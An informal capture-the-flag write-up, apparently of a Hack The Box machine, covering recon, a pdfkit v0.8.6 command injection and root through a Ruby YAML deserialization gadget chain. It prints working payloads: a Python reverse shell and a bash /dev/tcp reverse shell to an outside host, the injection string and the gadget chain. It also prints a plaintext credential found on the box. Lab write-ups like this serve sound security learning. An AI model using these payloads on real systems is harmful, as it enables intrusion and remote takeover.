
nmap 10.10.11.189  => 22 and 80 was open

I saw i have to convert web page to pdf => url to pdf 

so i create web server and sent like url => python3 -m http.server 

and client side => http://10.0.0.1:8000 => and download something wiht save button.

The file that's i download with pdf fomrat , i check like this .

exiftool vb3h23m9llf89f16x478urml69krwszw.pdf  

I found something interesting that i downloaded => Creator : Generated by pdfkit v0.8.6

so i found exploit version pdfkit v0.8.6

http://example.com/?name=#{'%20`sleep 5`'}  => i found it

I use thi payload for initial access   => 1 st step
[http://10.10.14.44:8000/?name=](http://10.10.14.44:8000/?name=){’%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.44",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`'}


-----


and then i got user access  from here  -> 2nd step

I RUN linpeas and i found => ruby->bundles->config-> with red color and i open it and get doneee…

"henry:Q3c1AqGHtoI0aXAYFH"

-----
Rooting 

Firstly i check wiht sudo -l  => i saw henry can run update_dependencies.rb  without sudo access

so i check this file and then i found dependencies.yml file was running by directly .

So i was created dependencies.yml file by googling with "yml rce"  

=> i replace this payload inspect of other payloads => "bash -c 'bash -i >& /dev/tcp/10.10.14.44/9999 0>&1’"   => we can also use   => "cat /root/root.txt"

-   !ruby/object:Gem::Installer  
    i: x
-   !ruby/object:Gem::SpecFetcher  
    i: y
-   !ruby/object:Gem::Requirement  
    requirements:  
    !ruby/object:Gem::Package::TarReader  
    io: &1 !ruby/object:Net::BufferedIO  
    io: &1 !ruby/object:Gem::Package::TarReader::Entry  
    read: 0  
    header: "abc"  
    debug_output: &1 !ruby/object:Net::WriteAdapter  
    socket: &1 !ruby/object:Gem::RequestSet  
    sets: !ruby/object:Net::WriteAdapter  
    socket: !ruby/module 'Kernel'  
    method_id: :system  
    git_set: "cat /root/root.txt"  
    method_id: :resolve

I can easily search like yml rce ###

and then run this file => sudo -l
and then run it => got rooot......



